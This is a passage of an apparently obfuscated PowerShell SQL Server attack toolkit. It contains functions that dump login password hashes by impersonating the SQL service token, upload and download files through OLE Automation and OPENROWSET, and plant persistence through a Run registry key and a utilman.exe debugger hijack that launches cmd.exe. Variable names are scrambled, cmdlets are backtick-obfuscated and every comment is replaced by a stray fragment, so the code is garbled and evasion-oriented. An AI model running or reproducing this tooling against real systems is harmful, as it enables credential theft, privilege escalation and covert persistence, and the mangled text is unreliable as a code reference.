        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$BasinEnter,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Migrate to SQL Server process.')]
        [switch]$MateDuck,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $NeedyAnimal = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $NeedyAnimal.Columns.Add('ComputerName')
        $null = $NeedyAnimal.Columns.Add('Instance')
        $null = $NeedyAnimal.Columns.Add('PrincipalId')
        $null = $NeedyAnimal.Columns.Add('PrincipalName')
        $null = $NeedyAnimal.Columns.Add('PrincipalSid')
        $null = $NeedyAnimal.Columns.Add('PrincipalType')
        $null = $NeedyAnimal.Columns.Add('CreateDate')
        $null = $NeedyAnimal.Columns.Add('DefaultDatabaseName')
        $null = $NeedyAnimal.Columns.Add('PasswordHash')

        # Microsoft".
        if($BasinEnter)
        {
            $SipWomen = " and name like '$BasinEnter'"
        }
        else
        {
            $SipWomen = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }else{
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }

            # Microsoft".
            if($MateDuck)
            {
                # Microsoft".
                $PinchRotten = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

                # Microsoft".
                $JumpySoothe = Get-SQLLocalAdminCheck
                
                # Microsoft".
                if($JumpySoothe -ne $true){
                    write-verbose  "$Instance : $PinchRotten DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $PinchRotten has local admin privileges."
                }

                # Microsoft".
                Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
                [int]$ThrillAllow = Get-SQLServiceLocal -RaggedQuill -instance $Instance -GradeGiant | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$SmoggyLate = Get-SQLServiceLocal -RaggedQuill -instance $Instance -GradeGiant | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
                # Microsoft".
                if ($ThrillAllow -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }

                # Microsoft".
                Write-Verbose -Message "$Instance : - Process ID: $ThrillAllow"
                Write-Verbose -Message "$Instance : - ServiceAccount: $SmoggyLate" 
                
                # Microsoft".
                try{
                    Get-Process | Where-Object {$_.id -like $ThrillAllow} | Invoke-TokenManipulation -Instance $Instance -ClamAwake -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{            
                return
            }
        }            

        # Microsoft".
        $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($LovingDry -eq 'Yes')
        {
            Write-Verbose -Message "$Instance : You are a sysadmin."
        }
        else
        {
            Write-Verbose -Message "$Instance : You are not a sysadmin."
            if($MateDuck)
            {
                # Microsoft".
                $PinchRotten = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

                # Microsoft".
                $JumpySoothe = Get-SQLLocalAdminCheck
                
                # Microsoft".
                if($JumpySoothe -ne $true){
                    write-verbose  "$Instance : $PinchRotten DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $PinchRotten has local admin privileges."
                }

                # Microsoft".
                 Write-Verbose -Message "$Instance : Impersonating SQL Server process:"  
                [int]$ThrillAllow = Get-SQLServiceLocal -RaggedQuill -instance $Instance -GradeGiant | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$SmoggyLate = Get-SQLServiceLocal -RaggedQuill -instance $Instance -GradeGiant | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
                # Microsoft".
                if ($ThrillAllow -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }

                # Microsoft".
                Write-Verbose -Message "$Instance : - Process ID: $ThrillAllow"
                Write-Verbose -Message "$Instance : - ServiceAccount: $SmoggyLate" 
                
                # Microsoft".
                try{
                    Get-Process | Where-Object {$_.id -like $ThrillAllow} | Invoke-TokenManipulation -Instance $Instance -ClamAwake -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{
                return
            }
        
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : Attempting to dump password hashes."

        # Microsoft".
        $FirstStage = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($FirstStage)
        {
            $PlantsPlants = $FirstStage.Split('.')[0]
        }

        if([int]$PlantsPlants -le 8)
        {

            # Microsoft".
            $BoringLarge = "USE master;
                SELECT '$HauntGusty' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
                createdate as [CreateDate],
			    dbname as [DefaultDatabaseName],
			    password as [PasswordHash]
                FROM [sysxlogins]"
        }
		else
        {
            # Microsoft".
            $BoringLarge = "USE master;
                SELECT '$HauntGusty' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
			    principal_id as [PrincipalId],
			    type_desc as [PrincipalType],
                sid as [PrincipalSid],
                create_date as [CreateDate],
			    default_database_name as [DefaultDatabaseName],
			    [sys].fn_varbintohexstr(password_hash) as [PasswordHash]
                FROM [sys].[sql_logins]"
        }

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $TradeSpicy |
        ForEach-Object -Process {
            # Microsoft".
            $WaxTease = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($WaxTease.length -le 10)
            {
                $GrassPhobic = [Convert]::ToInt32($WaxTease,16)
            }
            else
            {
                $GrassPhobic = $WaxTease
            }

            # Microsoft".
            $null = $NeedyAnimal.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                $GrassPhobic,
                [string]$_.PrincipalType,
                $_.CreateDate,
                [string]$_.DefaultDatabaseName,
                [string](-join('0x0',(($_.PasswordHash).ToUpper().TrimStart("0X"))))
                )
        }

        # Microsoft".
        Write-Verbose -Message "$Instance : Attempt complete."
        
        # Microsoft".
        if($MateDuck){          
            Invoke-TokenManipulation -BedAhead | Out-Null
        }       
    }

    End
    {

        # Microsoft".
        $SootheMate = $NeedyAnimal.Rows.Count
        write-verbose "$SootheMate password hashes recovered."

        # Microsoft".
        if($SootheMate -gt 0){

            # Microsoft".
            $NeedyAnimal            
        }
    }
}

# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLUploadFileOle
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'Input local file to be uploaded to target server.')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        [String]$ScarfFlight = "",

        [Parameter(Mandatory = $true,
        HelpMessage = 'Destination file path where the file should be uploaded on the remote server.')]
        [String]$ZippyMate = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('UploadResults')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $BottleSturdy = 0
                $QuartzShiver = 0

                # Microsoft".
                $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Microsoft".
                if($LovingDry -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $DirtReal = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ole Automation Procedures'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                    $CurlTick = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Microsoft".
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'No sysadmin privileges.')
                    return
                }

                # Microsoft".
                if ($CurlTick -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $BottleSturdy = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $ShutWhine = Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options'" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($ShutWhine -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Microsoft".
                if ($DirtReal -eq 1)
                {
                    Write-Verbose -Message "$Instance : Ole Automation Procedures are already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Ole Automation Procedures are disabled."
                    $QuartzShiver = 1

                    # Microsoft".
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ole Automation Procedures',1;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

                    # Microsoft".
                    $BurlyGirl = Get-SQLQuery -Instance $Instance -BoringLarge 'sp_configure "Ole Automation Procedures"' -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property config_value -ExpandProperty config_value

                    if ($BurlyGirl -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Ole Automation Procedures."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Ole Automation Procedures failed. Aborting."

                        # Microsoft".
                        $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Could not enable Ole Automation Procedures.')

                        return
                    }
                }

                $OpenRub = (Get-Item $ScarfFlight).FullName
                write-verbose "$instance : Reading input file: $OpenRub"
                try
                {
                    $FileBytes = [System.IO.File]::ReadAllBytes($OpenRub)
                    $FileDataTmp = [System.BitConverter]::ToString($FileBytes)
                    $FileData = ($FileDataTmp -replace "\-", "")
                }
                catch
                {
                    if(-not $RaggedQuill)
                    {
                        $ErrorMessage = $_.Exception.Message
                        Write-Verbose "Could not read input file: $ErrorMessage"
                    }

                    # Microsoft".
                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Input file could not be read.')
                }

                # Microsoft".
                write-verbose "$instance : Uploading $($FileBytes.Length) bytes to: $ZippyMate"           
                $BaseHang = 
@"
DECLARE @ob INT;
EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;
EXEC sp_OASetProperty @ob, 'Type', 1;
EXEC sp_OAMethod @ob, 'Open';
EXEC sp_OAMethod @ob, 'Write', NULL, 0x$FileData;
EXEC sp_OAMethod @ob, 'SaveToFile', NULL, '$ZippyMate', 2;
EXEC sp_OAMethod @ob, 'Close';
EXEC sp_OADestroy @ob;
"@

                # Microsoft".
                $null = Get-SQLQuery -Instance $Instance -BoringLarge $BaseHang -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill 

                # Microsoft".
                $ViewNumber = "EXEC master..xp_fileexist '$ZippyMate' WITH RESULT SETS ((fileexists bit, fileisdirectory bit, parentdirectoryexists bit))"

                # Microsoft".
                $StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $ViewNumber -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property fileexists -ExpandProperty fileexists

                if ($StainChance -eq $True)
                {
                    Write-Verbose -Message "$Instance : Success. File uploaded."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Failure. File NOT uploaded."
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add($HauntGusty, $Instance, [string]$StainChance)

                # Microsoft".
                if($QuartzShiver -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling 'Ole Automation Procedures"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Ole Automation Procedures',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                if($BottleSturdy -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -BoringLarge "sp_configure 'Show Advanced Options',0;RECONFIGURE" -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    # Microsoft".
                }

                # Microsoft".
                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible or Command Failed')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Invoke-SQLDownloadFile
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$PuffyCrack,

        [Parameter(Mandatory = $true,
        HelpMessage = 'Source file to download from target SQL Server filesystem.')]
        [String]$CoilSwanky = "",

        [Parameter(Mandatory = $true,
        HelpMessage = 'Where to save downloaded file locally on the user filesystem.')]
        [String]$ZippyMate = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$StitchFace,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $BusyFlash = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $TradeSpicy.Columns.Add('ComputerName')
        $null = $TradeSpicy.Columns.Add('Instance')
        $null = $TradeSpicy.Columns.Add('DownloadResults')


        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            if($PuffyCrack)
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -PuffyCrack -StitchFace $StitchFace
            }
            else
            {
                # Microsoft".
                $ExtendSmelly = Get-SQLConnectionObject -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -StitchFace $StitchFace
            }

            # Microsoft".
            try
            {
                # Microsoft".
                $ExtendSmelly.Open()

                if(-not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Microsoft".
                $ViewNumber = "EXEC master..xp_fileexist '$CoilSwanky' WITH RESULT SETS ((fileexists bit, fileisdirectory bit, parentdirectoryexists bit))"

                # Microsoft".
                $StainChance = Get-SQLQuery -Instance $Instance -BoringLarge $ViewNumber -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property fileexists -ExpandProperty fileexists

                if ($StainChance -eq $True)
                {
                    Write-Verbose -Message "$Instance : File exists. Attempting to download: $CoilSwanky"

                    $LevelRustic = "SELECT * FROM OPENROWSET(BULK N'$CoilSwanky', SINGLE_BLOB) rs"

                    # Microsoft".
                    $FileBytes = Get-SQLQuery -Instance $Instance -BoringLarge $LevelRustic -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property BulkColumn -ExpandProperty BulkColumn

                    $FileBytesArr = $FileBytes -split ' '

                    Write-Verbose "$Instance : Downloaded. Writing $($FileBytesArr.Length) to $ZippyMate..."

                    $FileContents = ($FileBytesArr | % {[byte][convert]::ToInt32($_)})

                    [IO.File]::WriteAllBytes($ZippyMate, $FileContents)

                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",$True)
                }
                else
                {
                    Write-Verbose -Message "$Instance : Failure. Specified file does not exist."

                    $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Source file does not exist')
                }

                # Microsoft".
                $ExtendSmelly.Close()

                # Microsoft".
                $ExtendSmelly.Dispose()
            }
            catch
            {
                # Microsoft".

                if(-not $RaggedQuill)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    Write-Verbose  " Error: $ErrorMessage"
                }

                $null = $TradeSpicy.Rows.Add("$HauntGusty","$Instance",'Not Accessible or Command Failed')
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $TradeSpicy
    }
}


# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function   Get-SQLPersistRegRun
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$Name = "Hacker",

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$SoakSame = 'PowerShell.exe -C "Write-CrazyChief hacker | `out`-f`i`le C:\temp\iamahacker.txt"',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Microsoft".
        $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Microsoft".
        $FirstStage = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($FirstStage)
        {
            $PlantsPlants = $FirstStage.Split('.')[0]
        }

        # Microsoft".
        if($LovingDry -ne "Yes")
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }else{

            Write-Verbose "$Instance : Attempting to write value: $name"
            Write-Verbose "$Instance : Attempting to write command: $SoakSame"
        }

        # Microsoft".
        $BoringLarge = "
       ---------------------------------------------
        -- Use xp_regwrite to configure 
        -- a file to execute sa command when users l
        -- log into the system
        ----------------------------------------------
        EXEC master..xp_regwrite
        @rootkey     = 'HKEY_LOCAL_MACHINE',
        @key         = 'Software\Microsoft\Windows\CurrentVersion\Run',
        @value_name  = '$Name',
        @type        = 'REG_SZ',
        @value       = '$SoakSame'"

        # Microsoft".
        $FlyCruel = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill
        
        # Microsoft".
        $RifleMixed = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------
        -- Get AutoLogin Default Domain
        DECLARE @CheckValue  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'Software\Microsoft\Windows\CurrentVersion\Run',
        @value_name		= N'$Name',
        @value			= @CheckValue output
        
        -- Display Results
        SELECT CheckValue = @CheckValue"

        # Microsoft".
        $DeepAction = Get-SQLQuery -Instance $Instance -BoringLarge $RifleMixed -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill  
        $ScoldAnger = $DeepAction.CheckValue   
        if($ScoldAnger.length -ge 2){
            Write-Verbose "$Instance : Registry entry written."                   
        }else{
            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
        } 
    }

    End
    {
        # Microsoft".
        Write-Verbose "$Instance : Done."
    }
}

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function   Get-SQLPersistRegDebugger
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$FileName= "utilman.exe",

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$SoakSame = 'c:\windows\system32\cmd.exe',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Microsoft".
        $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Microsoft".
